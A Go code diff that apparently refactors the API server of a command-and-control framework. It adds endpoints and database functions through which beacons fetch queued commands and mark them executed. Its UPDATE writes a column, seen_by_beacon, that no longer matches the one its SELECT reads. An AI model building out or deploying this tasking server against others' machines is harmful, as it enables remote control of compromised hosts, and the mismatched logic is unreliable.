@@ -14,15 +14,18 @@ import (
 )
 
 type Beacon struct {
-	IP       string `json:"ip" sql:"ip"`
-	Hostname string `json:"hostname" sql:"hostname"`
-	Commands []Command
+	ID       int32     `json:"id,omitempty"`
+	IP       string    `json:"ip"`
+	Hostname string    `json:"hostname"`
+	Commands []Command `json:"commands,omitempty"`
 }
 
 type Command struct {
-	Type         string `json:"type" sql:"c_type"`
-	Arg          string `json:"arg" sql:"c_arg"`
-	SeenByBeacon bool   `json:"seen_by_beacon" sql:"seen_by_beacon"`
+	ID       int32  `json:"id,omitempty"`
+	BeaconID int32  `json:"beacon_id,omitempty"`
+	Type     string `json:"type"`
+	Arg      string `json:"arg"`
+	Executed bool   `json:"executed,omitempty"`
 }
 
 type APIServer struct {
@@ -98,46 +101,72 @@ func (s *APIServer) Register(beacon Beacon) (int32, error) {
 	return id, nil
 }
 
-func (s *APIServer) GetBeaconByID(id int32) (Beacon, error) {
+func (s *APIServer) GetBeacon(id int32) (Beacon, error) {
 
 	row := s.db.QueryRow(
-		`SELECT ip, hostname 
+		`SELECT id, ip, hostname
 		FROM beacons
 		WHERE id = ?;`,
 		id,
 	)
 
 	beacon := Beacon{}
-	err := row.Scan(&beacon.IP, &beacon.Hostname)
+	err := row.Scan(&beacon.ID, &beacon.IP, &beacon.Hostname)
 	if err != nil {
 		return Beacon{}, err
 	}
 
+	commands, err := s.GetCommands(id)
+	if err != nil {
+		return Beacon{}, err
+	}
+
+	beacon.Commands = commands
+
+	return beacon, nil
+}
+
+func (s *APIServer) GetCommands(beacon_id int32) ([]Command, error) {
 	rows, err := s.db.Query(
-		`SELECT c_type, c_arg, seen_by_beacon
+		`SELECT id, beacon_id, c_type, c_arg, executed
 		FROM commands
 		WHERE beacon_id = ?
 		ORDER BY create_time;`,
-		id,
+		beacon_id,
 	)
-
 	if err != nil {
-		return Beacon{}, err
+		return []Command{}, err
 	}
+
+	commands := []Command{}
 	for {
 		anotherRow := rows.Next()
 		if !anotherRow && rows.Err() != nil {
-			return Beacon{}, err
+			return []Command{}, err
 
 		} else if !anotherRow {
 			break
 		}
 		c := Command{}
-		rows.Scan(&c.Type, &c.Arg, &c.SeenByBeacon)
-		beacon.Commands = append(beacon.Commands, c)
+		rows.Scan(&c.ID, &c.BeaconID, &c.Type, &c.Arg, &c.Executed)
+		commands = append(commands, c)
 	}
 
-	return beacon, nil
+	return commands, nil
+}
+
+func (s *APIServer) MarkCommandsExecuted(beacon_id int32) error {
+	_, err := s.db.Exec(`
+		UPDATE commands
+		SET seen_by_beacon = 1
+		WHERE beacon_id = ?;
+		`, beacon_id)
+
+	if err != nil {
+		return err
+	}
+
+	return nil
 }
 
 func (s *APIServer) DeleteBeaconByID(id int32) error {
@@ -215,7 +244,7 @@ func (s *APIServer) Run() error {
 		}
 
 		id := int32(id64)
-		beacon, err := s.GetBeaconByID(id)
+		beacon, err := s.GetBeacon(id)
 		if err != nil {
 			http.Error(w, fmt.Sprintf(
 				`{"msg": "%s"}`, err.Error()),
@@ -256,9 +285,38 @@ func (s *APIServer) Run() error {
 	})
 
 	router.HandleFunc("GET /beacon/{id}/commands", func(w http.ResponseWriter, r *http.Request) {
-		id := r.PathValue("id")
-		w.Write([]byte("Got ID Commands: " + id))
+		w.Header().Add("Content-Type", "application/json")
+		id64, err := strconv.ParseInt(r.PathValue("id"), 10, 32)
+		if err != nil {
+			http.Error(w, fmt.Sprintf(
+				`{"message": "%s"}`, err.Error()),
+				http.StatusInternalServerError)
+			return
+		}
+
+		id := int32(id64)
+		commands, err := s.GetCommands(id)
+		if err != nil {
+			http.Error(w, fmt.Sprintf(
+				`{"message": "%s"}`, err.Error()),
+				http.StatusInternalServerError)
+			return
+		}
+
+		if r.URL.Query().Get("mark_executed") == "true" {
+			s.MarkCommandsExecuted(id)
+		}
+
+		body, err := json.Marshal(commands)
+		if err != nil {
+			http.Error(w, fmt.Sprintf(
+				`{"msg": "%s"}`, err.Error()),
+				http.StatusInternalServerError)
+			return
+		}
+		w.Write(body)
 	})
+
 	router.HandleFunc("POST /beacon/{id}/commands", func(w http.ResponseWriter, r *http.Request) {
 		id := r.PathValue("id")
 		w.Write([]byte("Post ID Commands: " + id))
